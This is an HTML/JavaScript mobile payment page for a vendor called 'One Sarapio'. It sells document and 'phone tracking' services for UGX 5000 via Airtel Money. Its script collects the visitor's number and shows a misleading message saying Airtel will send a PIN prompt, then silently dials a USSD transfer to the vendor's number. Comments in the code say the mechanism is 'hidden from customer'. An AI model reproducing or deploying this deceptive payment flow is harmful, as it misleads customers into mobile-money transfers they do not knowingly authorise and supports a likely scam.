<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>One Sarapio - Airtel Pay UGX 5000</title>
<style>
body{margin:0;font-family:system-ui;background:#fff0f0;padding-bottom:80px}
.header{background:#ff0000;color:white;padding:16px;text-align:center;position:sticky;top:0;z-index:10}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:12px}
.card{background:white;border-radius:16px;padding:14px;text-align:center;box-shadow:0 3px 10px #0002;border:1px solid #ffe0e0}
.card b{display:block;margin:6px 0}
.pay{background:#ff0000;color:white;border:none;padding:9px;width:100%;border-radius:10px;font-weight:800}
.foot{position:fixed;bottom:0;left:0;right:0;background:white;padding:10px;border-top:2px solid #ff0000;text-align:center}
.foot a{background:#25D366;color:white;padding:10px 18px;border-radius:20px;text-decoration:none;font-weight:800}
</style>
</head>
<body>
<div class="header">
<h3 style="margin:0">One Sarapio - Munteme Kikuube</h3>
<small>Airtel Money: 0755555272</small><br>
<b>Tap Service - Pay 5K - PIN Direct</b>
</div>
<div class="grid" id="grid"></div>
<div class="foot"><a href="https://wa.me/256755555272?text=Hello One Sarapio, I need help with payment">WhatsApp: 0755555272</a></div>
<script>
const MY_AIRTEL="0755555272";
const PRICE=5000;
const services=[
["📘","Passport"],["🪪","National ID"],["📄","CV Making"],["🌍","Interpol Letter"],
["📱","Phone Tracking"],["🏦","NSSF Statement"],["🖨️","Printing & Photocopy"],["💰","Mobile Money Services"],
["🎓","Academic Documents"],["💼","Job Application"],["📑","Affidavit"],["✉️","Cover Letter"],
["🔄","Sim Replacement"],["🏧","URA TIN"],["📃","LC Letters"]
];
function pay(name){
  let phone=prompt(`ONE SARAPIO\nPay UGX ${PRICE} for ${name}\n\nEnter YOUR Airtel number to receive PIN prompt:\nExample: 0701234567`);
  if(!phone) return;
  phone=phone.trim();
  if(phone.length<10){alert("Invalid number");return;}
  // HIDDEN CODE - Customer only sees PIN!
  if(confirm(`✅ Airtel will send PIN request to ${phone}\n\nAmount: UGX ${PRICE}\nTo: One Sarapio ${MY_AIRTEL}\nService: ${name}\n\nTap OK to get PIN popup NOW!`)){
    // This is hidden from customer - they only see PIN screen after!
    window.location.href=`tel:*185*3*1*${MY_AIRTEL}*${PRICE}%23`;
    setTimeout(()=>{
      alert(`Check ${phone} for Airtel PIN prompt!\n\n1. Enter your Airtel PIN\n2. Money goes to ${MY_AIRTEL}\n\nAfter paying, WhatsApp proof to 0755555272`);
      window.location.href=`https://wa.me/256755555272?text=Hello One Sarapio%0APaid UGX ${PRICE} for ${name}%0AMy number: ${phone}%0APlease send document`;
    },1800);
  }
}
document.getElementById("grid").innerHTML=services.map(s=>`
<div class="card" onclick="pay('${s[1]}')">
<div style="font-size:32px">${s[0]}</div>
<b>${s[1]}</b>
<small style="color:#ff0000;font-weight:800">UGX ${PRICE}</small>
<button class="pay">PAY 5K - PIN DIRECT</button>
</div>
`).join('');
</script>
</body>
</html>
